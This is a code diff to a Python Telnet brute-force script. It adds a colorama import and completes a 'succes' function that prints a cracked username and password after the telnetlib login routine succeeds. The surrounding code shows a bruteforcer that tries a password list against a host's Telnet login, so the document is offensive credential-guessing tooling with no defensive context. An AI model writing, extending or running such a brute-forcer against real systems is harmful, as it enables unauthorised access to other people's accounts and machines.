@@ -2,7 +2,7 @@
 import telnetlib
 import os 
 import argparse
-
+import colorama
 def telconnect(host, username, password, port=23,code=0):
     tn =  telnetlib.Telnet(host, port, timeout=5)
     tn.read_until(b"login: ")
@@ -14,7 +14,13 @@ def telconnect(host, username, password, port=23,code=0):
         code = 1
     tn.close()
     return code
-def succes()
+def succes(username, password):
+    message  = f"""
+               **********
+               username:{username}\npassword:{password}
+               **********
+               """
+    print(colorama.Fore.GREEN, message)
 def bruteforcer(host, passwordlist, username, port=None):
     check = os.path.isfile(passwordlist)
     if check:
